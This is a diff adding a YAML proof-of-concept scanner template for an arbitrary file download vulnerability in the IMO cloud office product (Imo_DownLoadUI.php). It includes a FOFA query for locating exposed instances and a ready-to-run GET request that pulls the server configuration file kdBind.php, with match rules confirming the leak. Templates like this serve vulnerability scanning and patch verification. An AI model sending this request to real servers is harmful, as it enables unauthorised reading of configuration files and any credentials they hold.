@@ -1,0 +1,15 @@
+id: poc-yaml-imo-imo-downLoadui-fileread
+info:
+  name: imo云办公室接口 Imo_DownLoadUI.php任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: imo云办公室
+  fofa: app="IMO-云办公室"
+requests:
+- method: GET
+  path: /file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php
+  expression: "status_code == 200 && \ncontains(body,\"<?php\") &&\ncontains(body,\"\
+    $bindInfo\") &&\ncontains(headers,\"application/octet-stream\")\n"
+variables: {}
+transport: http
